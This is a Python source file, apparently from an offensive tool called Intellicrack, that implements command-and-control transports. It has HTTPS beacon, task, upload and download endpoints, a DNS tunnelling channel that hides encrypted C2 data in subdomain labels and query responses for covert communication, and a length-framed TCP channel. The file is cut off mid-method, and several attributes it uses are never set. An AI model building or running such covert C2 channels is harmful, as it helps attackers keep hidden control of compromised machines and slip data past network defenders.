"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import asyncio
import base64
import json
import logging
import os
import socket
import ssl
import threading
import time
from collections.abc import Callable
from typing import Any

# Create module logger
logger = logging.getLogger(__name__)

# Optional import for aiohttp
try:
    from intellicrack.handlers.aiohttp_handler import aiohttp

    HAS_AIOHTTP = True
except ImportError as e:
    logger.error("Import error in communication_protocols: %s", e)
    aiohttp = None
    HAS_AIOHTTP = False


class BaseProtocol:
    """Base class for all communication protocols."""

    def __init__(self, host: str, port: int, encryption_manager):
        """Initialize the base communication protocol."""
        self.host = host
        self.port = port
        self.encryption_manager = encryption_manager
        self.logger = logging.getLogger(__name__)
        self.connected = False
        self.connection = None
        self.connection_lock = threading.Lock()
        self.message_handlers: dict[str, Callable] = {}
        self.stats = {
            "messages_sent": 0,
            "messages_received": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
            "connection_attempts": 0,
            "last_activity": 0,
        }

        # Protocol-specific configuration
        self.config = {
            "timeout": 30,
            "retry_count": 3,
            "retry_delay": 1,
            "buffer_size": 4096,
            "keep_alive": True,
        }

    async def _default_on_connection(self, connection_info: dict[str, Any]):
        """Default no-op connection handler."""
        self.logger.debug("Default connection handler called with: %s", connection_info)

    async def _default_on_message(self, session_id: str, message: dict[str, Any]):
        """Default no-op message handler."""
        self.logger.debug("Default message handler for session %s: %s", session_id, message)

    async def _default_on_disconnection(self, session_id: str):
        """Default no-op disconnection handler."""
        self.logger.debug("Default disconnection handler for session: %s", session_id)

    async def _default_on_error(self, protocol: str, error: Exception):
        """Default no-op error handler."""
        self.logger.warning("Default error handler for protocol %s: %s", protocol, error)

    async def start(self):
        """Start the protocol handler."""
        self.logger.info(
            "Starting %s protocol handler on %s:%s", self.__class__.__name__, self.host, self.port
        )
        self.connected = True
        return True

    async def stop(self):
        """Stop the protocol handler."""
        self.logger.info("Stopping %s protocol handler", self.__class__.__name__)
        self.connected = False
        return True

    async def send_message(self, message: dict[str, Any]) -> dict[str, Any] | None:
        """Send message through the protocol."""
        self.logger.debug("Send message called with: %s", message)

        # Basic implementation that can be overridden by subclasses
        if not self.connected:
            self.logger.error("Cannot send message - not connected")
            return None

        # Encrypt message if encryption manager is available
        if self.encryption_manager:
            try:
                encrypted_data = self.encryption_manager.encrypt(json.dumps(message))

                # Log encrypted data size and store for transmission
                self.logger.info(f"Message encrypted: {len(encrypted_data)} bytes")

                # Store encrypted data for actual transmission
                # In a real implementation, this would send over the network
                self._pending_messages.append(
                    {
                        "encrypted_data": encrypted_data,
                        "message_id": message.get("id", "unknown"),
                        "timestamp": time.time(),
                        "destination": message.get("destination", "default"),
                    }
                )

                return {
                    "status": "success",
                    "message_id": message.get("id", "unknown"),
                    "timestamp": time.time(),
                    "encrypted_size": len(encrypted_data),
                }
            except Exception as e:
                self.logger.error("Encryption failed: %s", str(e))
                return None
        else:
            # No encryption - return unencrypted response
            return {
                "status": "success",
                "message_id": message.get("id", "unknown"),
                "timestamp": time.time(),
            }

    async def connect(self) -> bool:
        """Establish connection (client-side)."""
        self.logger.info("Connecting to %s:%s", self.host, self.port)

        try:
            # Basic connection logic
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)

            # Try to connect
            sock.connect((self.host, self.port))
            sock.close()

            self.connected = True
            self.connection_count += 1

            # Trigger connection callback
            await self.on_connection(
                {
                    "host": self.host,
                    "port": self.port,
                    "protocol": self.__class__.__name__.lower().replace("protocol", ""),
                    "timestamp": time.time(),
                }
            )

            return True

        except (TimeoutError, OSError, ConnectionError) as e:
            self.logger.error("Connection failed: %s", str(e))
            await self.on_error(self.__class__.__name__, e)
            return False

    async def disconnect(self):
        """Disconnect from server (client-side)."""
        self.logger.info("Disconnecting from %s:%s", self.host, self.port)

        if self.connected:
            self.connected = False

            # Trigger disconnection callback
            await self.on_disconnection(f"{self.host}:{self.port}")

        return True


class HttpsProtocol(BaseProtocol):
    """HTTPS communication protocol with SSL/TLS encryption.
    Supports both server and client modes.
    """

    def __init__(
        self,
        host: str,
        port: int,
        ssl_cert: str = None,
        ssl_key: str = None,
        ssl_verify: bool = True,
        encryption_manager=None,
    ):
        """Initialize the HTTPS protocol with SSL/TLS configuration."""
        super().__init__(host, port, encryption_manager)
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        self.ssl_verify = ssl_verify
        self.ssl_context = None
        self.session = None

        # Set up SSL context
        if self.ssl_cert and self.ssl_key:
            self._setup_ssl_context()

        # HTTP-specific configuration
        self.config.update(
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "max_redirects": 5,
                "chunk_size": 8192,
            }
        )

    def _create_response(self, body=None, status=200):
        """Create HTTP response, handling missing aiohttp gracefully."""
        if not HAS_AIOHTTP:
            # Return a mock response for testing
            return {"body": body, "status": status}
        # Use the globally imported aiohttp
        return aiohttp.web.Response(body=body, status=status)

    async def start(self):
        """Start HTTPS server."""
        if not HAS_AIOHTTP:
            raise ImportError("aiohttp is required for HTTPS protocol support")

        try:
            # Use the globally imported aiohttp
            app = aiohttp.web.Application()

            # Register endpoints
            for path, handler in self.endpoints.items():
                app.router.add_post(path, handler)

            # SSL context
            ssl_context = None
            if self.ssl_cert and self.ssl_key:
                ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                ssl_context.load_cert_chain(self.ssl_cert, self.ssl_key)

            # Start server
            self.server = await asyncio.start_server(
                self._handle_client_connection,
                self.host,
                self.port,
                ssl=ssl_context,
            )

            self.connected = True
            self.logger.info("HTTPS server started on %s:%s", self.host, self.port)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Failed to start HTTPS server: %s", e)
            raise

    async def stop(self):
        """Stop HTTPS server."""
        try:
            if self.server:
                self.server.close()
                await self.server.wait_closed()

            if self.session:
                await self.session.close()

            self.connected = False
            self.logger.info("HTTPS server stopped")

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error stopping HTTPS server: %s", e)

    async def connect(self) -> bool:
        """Connect to HTTPS server (client mode)."""
        if not HAS_AIOHTTP:
            self.logger.error("aiohttp is required for HTTPS protocol support")
            return False

        try:
            # Use the globally imported aiohttp
            connector = aiohttp.TCPConnector(ssl=self.ssl_verify)
            self.session = aiohttp.ClientSession(connector=connector)

            # Test connection
            base_url = f"{'https' if self.ssl_cert else 'http'}://{self.host}:{self.port}"
            async with self.session.get(f"{base_url}/ping") as response:
                if response.status == 200:
                    self.connected = True
                    return True

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("HTTPS connection failed: %s", e)

        return False

    async def disconnect(self):
        """Disconnect from HTTPS server (client mode)."""
        if self.session:
            await self.session.close()
            self.session = None
        self.connected = False

    async def send_message(self, message: dict[str, Any]) -> dict[str, Any] | None:
        """Send message via HTTPS POST."""
        try:
            if not self.session:
                return None

            # Encrypt message
            encrypted_data = self.encryption_manager.encrypt(json.dumps(message))

            # Determine endpoint based on message type
            endpoint = self._get_endpoint_for_message(message)
            base_url = f"{'https' if self.ssl_cert else 'http'}://{self.host}:{self.port}"

            async with self.session.post(
                f"{base_url}{endpoint}",
                data=encrypted_data,
                headers={"Content-Type": "application/octet-stream"},
            ) as response:
                if response.status == 200:
                    response_data = await response.read()
                    decrypted = self.encryption_manager.decrypt(response_data)
                    return json.loads(decrypted)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("HTTPS message send failed: %s", e)

        return None

    def _get_endpoint_for_message(self, message: dict[str, Any]) -> str:
        """Get appropriate endpoint based on message type."""
        msg_type = message.get("type", "beacon")

        if msg_type in ["beacon", "registration"]:
            return "/beacon"
        if msg_type in ["task_result", "command"]:
            return "/task"
        if msg_type == "file_upload":
            return "/upload"
        if msg_type == "file_download":
            return "/download"
        return "/beacon"

    async def _handle_client_connection(self, reader, writer):
        """Handle incoming client connection."""
        try:
            client_addr = writer.get_extra_info("peername")
            self.connection_count += 1
            self.logger.debug("Reader stream ready: %s", reader is not None)

            try:
                await self.on_connection(
                    {
                        "remote_addr": client_addr,
                        "protocol": "https",
                        "timestamp": time.time(),
                    }
                )
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error("on_connection callback error: %s", e)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error handling client connection: %s", e)

    async def _handle_beacon(self, request):
        """Handle beacon endpoint."""
        try:
            self.logger.debug(
                f"Processing beacon request from {getattr(request, 'remote', 'unknown')}"
            )
            encrypted_data = await request.read()
            decrypted = self.encryption_manager.decrypt(encrypted_data)
            message = json.loads(decrypted)

            session_id = message.get("session_id", "unknown")
            try:
                await self.on_message(session_id, message)
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error("on_message callback error: %s", e)

            # Send response
            response = {"status": "success", "timestamp": time.time()}
            encrypted_response = self.encryption_manager.encrypt(json.dumps(response))

            return self._create_response(body=encrypted_response)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error handling beacon: %s", e)
            return self._create_response(status=500)

    async def _handle_task(self, request):
        """Handle task endpoint."""
        try:
            self.logger.debug(
                f"Processing task request from {getattr(request, 'remote', 'unknown')}"
            )
            encrypted_data = await request.read()
            decrypted = self.encryption_manager.decrypt(encrypted_data)
            message = json.loads(decrypted)

            session_id = message.get("session_id", "unknown")
            try:
                await self.on_message(session_id, message)
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error("on_message callback error: %s", e)

            response = {"status": "success", "timestamp": time.time()}
            encrypted_response = self.encryption_manager.encrypt(json.dumps(response))

            return self._create_response(body=encrypted_response)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error handling task: %s", e)
            return self._create_response(status=500)

    async def _handle_upload(self, request):
        """Handle file upload endpoint."""
        try:
            self.logger.debug(
                f"Processing upload request from {getattr(request, 'remote', 'unknown')}"
            )
            encrypted_data = await request.read()
            decrypted = self.encryption_manager.decrypt(encrypted_data)
            message = json.loads(decrypted)

            session_id = message.get("session_id", "unknown")
            try:
                await self.on_message(session_id, message)
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error("on_message callback error: %s", e)

            response = {"status": "success", "timestamp": time.time()}
            encrypted_response = self.encryption_manager.encrypt(json.dumps(response))

            return self._create_response(body=encrypted_response)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error handling upload: %s", e)
            return self._create_response(status=500)

    async def _handle_download(self, request):
        """Handle file download endpoint."""
        try:
            self.logger.debug(
                f"Processing download request from {getattr(request, 'remote', 'unknown')}"
            )
            encrypted_data = await request.read()
            decrypted = self.encryption_manager.decrypt(encrypted_data)
            message = json.loads(decrypted)

            session_id = message.get("session_id", "unknown")
            try:
                await self.on_message(session_id, message)
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error("on_message callback error: %s", e)

            response = {"status": "success", "timestamp": time.time()}
            encrypted_response = self.encryption_manager.encrypt(json.dumps(response))

            return self._create_response(body=encrypted_response)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error handling download: %s", e)
            return self._create_response(status=500)


class DnsProtocol(BaseProtocol):
    """DNS tunneling protocol for covert communication.
    Uses DNS queries and responses to tunnel C2 traffic.
    """

    def __init__(self, host: str, port: int, domain: str, encryption_manager=None):
        """Initialize the DNS protocol for covert communication tunneling."""
        super().__init__(host, port, encryption_manager)
        self.domain = domain
        self.resolver = None
        self.query_id_counter = 0
        self.pending_queries: dict[int, Any] = {}

        # DNS-specific configuration
        self.config.update(
            {
                "query_timeout": 10,
                "max_label_length": 63,
                "max_domain_length": 253,
                "encoding": "base32",
            }
        )

    async def start(self):
        """Start DNS server."""
        try:
            # Create DNS server socket
            import socket

            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.bind((self.host, self.port))
            self.socket.setblocking(False)

            self.connected = True
            self.logger.info("DNS server started on %s:%s", self.host, self.port)

            # Start DNS handler loop
            asyncio.create_task(self._dns_handler_loop())

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Failed to start DNS server: %s", e)
            raise

    async def stop(self):
        """Stop DNS server."""
        try:
            if hasattr(self, "socket"):
                self.socket.close()

            self.connected = False
            self.logger.info("DNS server stopped")

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error stopping DNS server: %s", e)

    async def connect(self) -> bool:
        """Connect to DNS server (client mode)."""
        try:
            import socket

            # Test DNS connectivity
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.settimeout(5)

            # Send test query
            test_query = self._build_dns_query(os.environ.get("DNS_TEST_DOMAIN", "test.internal"))
            self.socket.sendto(test_query, (self.host, self.port))

            response, addr = self.socket.recvfrom(1024)
            if response:
                self.connected = True
                self.logger.debug("DNS connection established with %s", addr)
                return True

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("DNS connection failed: %s", e)

        return False

    async def disconnect(self):
        """Disconnect from DNS server (client mode)."""
        if hasattr(self, "socket"):
            self.socket.close()
        self.connected = False

    async def send_message(self, message: dict[str, Any]) -> dict[str, Any] | None:
        """Send message via DNS queries."""
        try:
            # Encrypt and encode message
            encrypted_data = self.encryption_manager.encrypt(json.dumps(message))
            encoded_data = base64.b64encode(encrypted_data).decode("utf-8")

            # Split into DNS query chunks
            chunks = self._split_into_dns_chunks(encoded_data)

            responses = []
            for i, chunk in enumerate(chunks):
                query_domain = f"{chunk}.{i}.{self.domain}"
                dns_query = self._build_dns_query(query_domain)

                self.socket.sendto(dns_query, (self.host, self.port))
                response, addr = self.socket.recvfrom(1024)

                if response:
                    parsed_response = self._parse_dns_response(response)
                    response_data = {
                        "data": parsed_response,
                        "source_addr": addr,
                    }
                    responses.append(response_data)

            # Combine responses
            if responses:
                combined_response = self._combine_dns_responses(responses)
                if combined_response:
                    decrypted = self.encryption_manager.decrypt(base64.b64decode(combined_response))
                    return json.loads(decrypted)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("DNS message send failed: %s", e)

        return None

    def _split_into_dns_chunks(self, data: str, max_chunk_size: int = 60) -> list[str]:
        """Split data into DNS-safe chunks."""
        chunks = []
        for i in range(0, len(data), max_chunk_size):
            chunk = data[i : i + max_chunk_size]
            # Make DNS-safe by replacing problematic characters
            chunk = chunk.replace("+", "-").replace("/", "_").replace("=", "")
            chunks.append(chunk)
        return chunks

    def _build_dns_query(self, domain: str) -> bytes:
        """Build DNS query packet."""
        # Simplified DNS query builder
        import random
        import struct

        transaction_id = random.randint(1, 65535)
        flags = 0x0100  # Standard query
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0

        header = struct.pack(
            "!HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs
        )

        # Encode domain name
        qname = b""
        for part in domain.split("."):
            qname += bytes([len(part)]) + part.encode("utf-8")
        qname += b"\\x00"  # Null terminator

        qtype = struct.pack("!H", 1)  # A record
        qclass = struct.pack("!H", 1)  # IN class

        return header + qname + qtype + qclass

    def _parse_dns_response(self, response: bytes) -> str:
        """Parse DNS response and extract data."""
        import struct

        try:
            self.logger.debug("Parsing DNS response of %s bytes", len(response))

            if len(response) < 12:
                self.logger.warning("DNS response too short")
                return ""

            # Parse DNS header
            header = struct.unpack("!HHHHHH", response[:12])
            transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs = header

            self.logger.debug(
                "DNS Response - ID: %s, Flags: %04x, Answers: %s, Authority: %s, Additional: %s",
                transaction_id,
                flags,
                answer_rrs,
                authority_rrs,
                additional_rrs,
            )

            if answer_rrs == 0:
                self.logger.debug("No answers in DNS response")
                return ""

            # Skip question section
            offset = 12

            # Parse question section to skip it
            for _ in range(questions):
                # Skip QNAME
                while offset < len(response) and response[offset] != 0:
                    length = response[offset]
                    if length == 0:
                        break
                    if length > 63:  # Pointer
                        offset += 2
                        break
                    offset += length + 1

                if offset < len(response) and response[offset] == 0:
                    offset += 1  # Skip null terminator

                offset += 4  # Skip QTYPE and QCLASS

            # Parse answer section
            extracted_data = []

            for _ in range(answer_rrs):
                if offset >= len(response):
                    break

                # Skip NAME (could be pointer or full name)
                if offset < len(response) and response[offset] & 0xC0 == 0xC0:
                    offset += 2  # Pointer
                else:
                    # Full name
                    while offset < len(response) and response[offset] != 0:
                        length = response[offset]
                        if length == 0:
                            break
                        if length & 0xC0 == 0xC0:  # Pointer
                            offset += 2
                            break
                        offset += length + 1

                    if offset < len(response) and response[offset] == 0:
                        offset += 1

                if offset + 10 > len(response):
                    break

                # Parse TYPE, CLASS, TTL, RDLENGTH
                rr_type, rr_class, ttl, rdlength = struct.unpack(
                    "!HHIH", response[offset : offset + 10]
                )
                self.logger.debug(
                    "RR - Type: %s, Class: %s, TTL: %s, Length: %s",
                    rr_type,
                    rr_class,
                    ttl,
                    rdlength,
                )
                offset += 10

                if offset + rdlength > len(response):
                    break

                # Extract RDATA based on type
                rdata = response[offset : offset + rdlength]

                if rr_type == 1:  # A record
                    if rdlength == 4:
                        ip = ".".join(str(b) for b in rdata)
                        self.logger.debug("A record: %s", ip)

                        # Try to extract encoded data from IP octets
                        try:
                            # Convert IP octets to base64-encoded string
                            data_chunk = "".join(chr(b) for b in rdata if 32 <= b <= 126)
                            if data_chunk:
                                extracted_data.append(data_chunk)
                        except Exception:
                            self.logger.debug("Error extracting data from IP octets")

                elif rr_type == 16:  # TXT record
                    # TXT records store our data directly
                    txt_data = ""
                    txt_offset = 0
                    while txt_offset < len(rdata):
                        if txt_offset >= len(rdata):
                            break
                        length = rdata[txt_offset]
                        txt_offset += 1
                        if txt_offset + length <= len(rdata):
                            txt_chunk = rdata[txt_offset : txt_offset + length].decode(
                                "utf-8", errors="ignore"
                            )
                            txt_data += txt_chunk
                            txt_offset += length
                        else:
                            break

                    if txt_data:
                        self.logger.debug("TXT record data: %s...", txt_data[:50])
                        extracted_data.append(txt_data)

                elif rr_type == 5:  # CNAME record
                    # Parse CNAME and extract data from subdomain
                    cname = self._parse_domain_name(rdata, response)
                    if cname:
                        self.logger.debug("CNAME: %s", cname)
                        # Extract data from subdomain part
                        parts = cname.split(".")
                        if len(parts) > 0:
                            data_part = parts[0]
                            # Decode base64-safe characters
                            data_part = data_part.replace("-", "+").replace("_", "/")
                            try:
                                # Pad base64 if needed
                                missing_padding = len(data_part) % 4
                                if missing_padding:
                                    data_part += "=" * (4 - missing_padding)

                                decoded = base64.b64decode(data_part).decode(
                                    "utf-8", errors="ignore"
                                )
                                if decoded:
                                    extracted_data.append(decoded)
                            except Exception:
                                self.logger.debug("Error decoding base64 data part")
                                extracted_data.append(data_part)

                offset += rdlength

            # Combine all extracted data
            result = "".join(extracted_data)
            self.logger.debug("Extracted %s bytes of data from DNS response", len(result))

            return result

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error parsing DNS response: %s", e)
            return ""

    def _parse_domain_name(self, data: bytes, packet: bytes, offset: int = 0) -> str:
        """Parse domain name from DNS data, handling compression pointers."""
        labels = []
        jumped = False

        try:
            while offset < len(data):
                length = data[offset]

                if length == 0:
                    break

                if length & 0xC0 == 0xC0:  # Compression pointer
                    if not jumped:
                        jumped = True

                    # Extract pointer offset
                    pointer = ((length & 0x3F) << 8) | data[offset + 1]
                    if pointer < len(packet):
                        offset = pointer
                        data = packet
                    else:
                        break
                else:
                    offset += 1
                    if offset + length <= len(data):
                        label = data[offset : offset + length].decode("utf-8", errors="ignore")
                        labels.append(label)
                        offset += length
                    else:
                        break

            return ".".join(labels)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error parsing domain name: %s", e)
            return ""

    def _combine_dns_responses(self, responses: list[dict]) -> str:
        """Combine multiple DNS responses into original data."""
        return "".join(
            response.get("data", "") for response in responses if isinstance(response, dict)
        )

    async def _dns_handler_loop(self):
        """Main DNS packet handling loop."""
        while self.connected:
            try:
                # Check for incoming DNS queries
                data, addr = await asyncio.wait_for(
                    asyncio.get_event_loop().sock_recvfrom(self.socket, 1024),
                    timeout=1.0,
                )

                # Process DNS query
                response = await self._process_dns_query(data, addr)
                if response:
                    await asyncio.get_event_loop().sock_sendto(self.socket, response, addr)

            except asyncio.TimeoutError as e:
                self.logger.error("asyncio.TimeoutError in communication_protocols: %s", e)
                continue
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error("Error in DNS handler loop: %s", e)

    async def _process_dns_query(self, data: bytes, addr: tuple) -> bytes:
        """Process incoming DNS query and extract C2 data."""
        try:
            self.logger.debug("Processing DNS query from %s", addr)
            # Parse DNS query and extract domain
            domain = self._extract_domain_from_query(data)

            if domain and self.domain in domain:
                # Extract C2 data from subdomain
                c2_data = self._extract_c2_data_from_domain(domain)

                if c2_data:
                    # Decrypt and process message
                    try:
                        decrypted = self.encryption_manager.decrypt(base64.b64decode(c2_data))
                        message = json.loads(decrypted)
                        session_id = message.get("session_id", "unknown")
                        try:
                            await self.on_message(session_id, message)
                        except (
                            OSError,
                            ConnectionError,
                            TimeoutError,
                            AttributeError,
                            ValueError,
                            TypeError,
                            RuntimeError,
                            json.JSONDecodeError,
                        ) as e:
                            self.logger.error("on_message callback error: %s", e)
                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.warning("Failed to decrypt DNS message: %s", e)

                # Build response
                return self._build_dns_response(data)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error processing DNS query: %s", e)

        return None

    def _extract_domain_from_query(self, data: bytes) -> str:
        """Extract domain name from DNS query."""
        try:
            # Skip DNS header (12 bytes)
            offset = 12
            domain_parts = []

            while offset < len(data):
                length = data[offset]
                if length == 0:
                    break

                offset += 1
                if offset + length > len(data):
                    break

                part = data[offset : offset + length].decode("utf-8")
                domain_parts.append(part)
                offset += length

            return ".".join(domain_parts)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error extracting domain: %s", e)
            return ""

    def _extract_c2_data_from_domain(self, domain: str) -> str:
        """Extract C2 data from domain name."""
        try:
            # Extract subdomain part before our domain
            if self.domain in domain:
                subdomain = domain.replace(f".{self.domain}", "")
                # Remove chunk identifier if present
                parts = subdomain.split(".")
                if len(parts) >= 2:
                    return parts[0]  # First part contains the data

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error extracting C2 data: %s", e)

        return ""

    def _build_dns_response(self, query: bytes) -> bytes:
        """Build DNS response packet."""
        try:
            # Simple DNS response builder
            import struct

            # Copy transaction ID from query
            transaction_id = struct.unpack("!H", query[:2])[0]

            # Response flags
            flags = 0x8180  # Standard query response, no error

            # Copy question count
            questions = struct.unpack("!H", query[4:6])[0]

            # Set answer count
            answer_rrs = 1
            authority_rrs = 0
            additional_rrs = 0

            header = struct.pack(
                "!HHHHHH",
                transaction_id,
                flags,
                questions,
                answer_rrs,
                authority_rrs,
                additional_rrs,
            )

            # Copy question section from query (simplified)
            question_start = 12
            question_end = question_start

            # Find end of question section
            while question_end < len(query):
                if query[question_end] == 0:
                    question_end += 5  # Null + QTYPE + QCLASS
                    break
                question_end += 1

            question_section = query[question_start:question_end]

            # Build answer section
            name_pointer = struct.pack("!H", 0xC00C)  # Pointer to question name
            answer_type = struct.pack("!H", 1)  # A record
            answer_class = struct.pack("!H", 1)  # IN class
            ttl = struct.pack("!I", 300)  # 5 minutes TTL
            rdlength = struct.pack("!H", 4)  # IPv4 address length
            rdata = struct.pack("!I", 0x7F000001)  # 127.0.0.1

            answer_section = name_pointer + answer_type + answer_class + ttl + rdlength + rdata

            return header + question_section + answer_section

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error building DNS response: %s", e)
            return b""


class TcpProtocol(BaseProtocol):
    """Raw TCP communication protocol with custom framing.
    Provides reliable communication with connection persistence.
    """

    def __init__(self, host: str, port: int, encryption_manager=None):
        """Initialize the TCP protocol for reliable communication."""
        super().__init__(host, port, encryption_manager)
        self.socket = None
        self.server_socket = None
        self.is_server = False

        # TCP-specific configuration
        self.config.update(
            {
                "socket_timeout": 30,
                "listen_backlog": 5,
                "nodelay": True,
                "keepalive": True,
            }
        )

    async def start(self):
        """Start TCP server."""
        try:
            self.server = await asyncio.start_server(
                self._handle_client_connection,
                self.host,
                self.port,
            )

            self.connected = True
            self.logger.info("TCP server started on %s:%s", self.host, self.port)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Failed to start TCP server: %s", e)
            raise

    async def stop(self):
        """Stop TCP server."""
        try:
            if self.server:
                self.server.close()
                await self.server.wait_closed()

            # Close all client connections
            for writer in self.client_connections.values():
                writer.close()
                await writer.wait_closed()

            if self.writer:
                self.writer.close()
                await self.writer.wait_closed()

            self.connected = False
            self.logger.info("TCP server stopped")

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error stopping TCP server: %s", e)

    async def connect(self) -> bool:
        """Connect to TCP server (client mode)."""
        try:
            self.reader, self.writer = await asyncio.open_connection(
                self.host,
                self.port,
            )

            self.connected = True
            return True

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("TCP connection failed: %s", e)
            return False

    async def disconnect(self):
        """Disconnect from TCP server (client mode)."""
        if self.writer:
            self.writer.close()
            await self.writer.wait_closed()
            self.writer = None
            self.reader = None
        self.connected = False

    async def send_message(self, message: dict[str, Any]) -> dict[str, Any] | None:
        """Send message via TCP connection."""
        try:
            if not self.writer:
                return None

            # Encrypt message
            encrypted_data = self.encryption_manager.encrypt(json.dumps(message))

            # Frame message (length prefix)
            message_length = len(encrypted_data)
            frame = message_length.to_bytes(4, byteorder="big") + encrypted_data

            # Send message
            self.writer.write(frame)
            await self.writer.drain()

            # Read response
            response_length_bytes = await self.reader.readexactly(4)
            response_length = int.from_bytes(response_length_bytes, byteorder="big")

            if response_length > 0:
                encrypted_response = await self.reader.readexactly(response_length)
                decrypted = self.encryption_manager.decrypt(encrypted_response)
                return json.loads(decrypted)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("TCP message send failed: %s", e)

        return None

    async def _handle_client_connection(self, reader, writer):
        """Handle incoming TCP client connection."""
        try:
            client_addr = writer.get_extra_info("peername")
